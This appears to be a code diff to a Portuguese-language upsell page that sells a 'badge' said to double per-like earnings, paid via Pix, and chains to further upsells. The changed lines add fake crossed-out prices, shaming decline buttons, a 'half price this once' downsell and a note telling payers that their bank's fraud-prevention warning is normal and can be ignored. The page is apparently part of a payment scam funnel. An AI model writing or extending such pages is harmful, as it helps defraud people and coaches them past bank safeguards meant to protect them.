@@ -61,7 +61,7 @@
         <li>Benefícios permanentes, ativos assim que o pagamento é confirmado.</li>
       </ul>
 
-      <p class="price-line">Ativação única do selo: <span class="price-line-old">R$ 97,00</span> <strong class="price-line-value">R$ 24,90</strong></p>
+      <p class="price-line">Ativação única do selo: <span class="price-line-old">R$ 97,00</span> <strong class="price-line-value">R$ 15,00</strong></p>
 
       <a href="#" class="cta" id="accept-main">ATIVAR SELO E DOBRAR MINHAS CURTIDAS</a>
       <button type="button" class="decline-link" id="decline-main">Não, prefiro continuar recebendo menos por curtida</button>
@@ -91,7 +91,7 @@
 
       <p class="notice-text">Como você já chegou até aqui, liberamos o selo pela metade do preço, só dessa vez. Suas curtidas continuam valendo o dobro assim que o selo for ativado.</p>
 
-      <p class="price-line">Ativação única do selo: <span class="price-line-old">R$ 24,90</span> <strong class="price-line-value">R$ 12,45</strong></p>
+      <p class="price-line">Ativação única do selo: <span class="price-line-old">R$ 15,00</span> <strong class="price-line-value">R$ 12,45</strong></p>
 
       <a href="#" class="cta" id="accept-downsell">SIM, QUERO POR R$ 12,45</a>
       <button type="button" class="decline-link" id="decline-downsell">Não, prefiro não aparecer mais pras coroas</button>
@@ -101,15 +101,17 @@
     <div id="pix-panel" class="pix-panel" hidden>
       <p class="pix-panel-title">Escaneie ou copie o código Pix</p>
       <p class="pix-panel-subtitle">Assim que o pagamento cair, o selo é ativado automaticamente no seu perfil.</p>
-      <div class="pix-qr-box">
+      <div class="pix-qr-box" id="pix-qr-box" title="Clique para copiar o código Pix">
         <img id="pix-qr-img" src="" alt="QR Code Pix">
       </div>
-      <p class="pix-code-label">Pix copia e cola</p>
-      <div class="pix-code-row">
+      <p class="pix-code-label">Pix copia e cola (clique pra copiar)</p>
+      <div class="pix-code-row" id="pix-code-row">
         <input type="text" id="pix-code-input" readonly value="">
         <button type="button" class="pix-copy-btn" id="pix-copy-btn">Copiar</button>
       </div>
+      <p class="pix-copied-feedback" id="pix-copied-feedback" hidden>✓ Código copiado!</p>
       <p class="pix-status" id="pix-status-text">Aguardando pagamento...</p>
+      <p class="pix-fraud-note">Seu banco pode exibir um aviso de prevenção a fraudes por ser a primeira vez que você paga pra essa chave. Isso é normal, pode confirmar o pagamento tranquilamente.</p>
       <p class="pix-error" id="pix-error-text" hidden></p>
     </div>
 
@@ -150,19 +152,18 @@
     window.UPSELL_CONFIG = {
       step: 'selo',
       pagePath: '/upsell-selo/',
-      mainPrice: 24.90,
+      mainPrice: 15.00,
       downsellPrice: 12.45,
       mainCheckoutUrl: 'https://go.frendz.com.br/8whgzth5cp',
       downsellCheckoutUrl: 'https://go.frendz.com.br/fhm9k',
-      // PIX gerado direto na página via Cloud Function (não sai pro checkout
-      // hospedado). Se a função falhar, upsell-flow.js cai pro checkout acima.
+      // PIX gerado direto na página via api/create-pix.php (não sai pro
+      // checkout hospedado). Se a chamada falhar, upsell-flow.js cai pro checkout acima.
       pix: {
-        functionsBaseUrl: 'https://us-central1-madame-67e19.cloudfunctions.net',
         mainChargeKey: 'selo_main',
         downsellChargeKey: 'selo_downsell'
       },
-      // Última da cadeia: recusar o downsell (ou confirmar o PIX) manda pro app final
-      nextUrl: 'https://appdomadames.netlify.app'
+      // Recusar o downsell (ou confirmar o PIX) manda pro próximo upsell da cadeia
+      nextUrl: '/upsell-antecipacao/'
     };
   </script>
   <script src="/js/upsell-flow.js"></script>
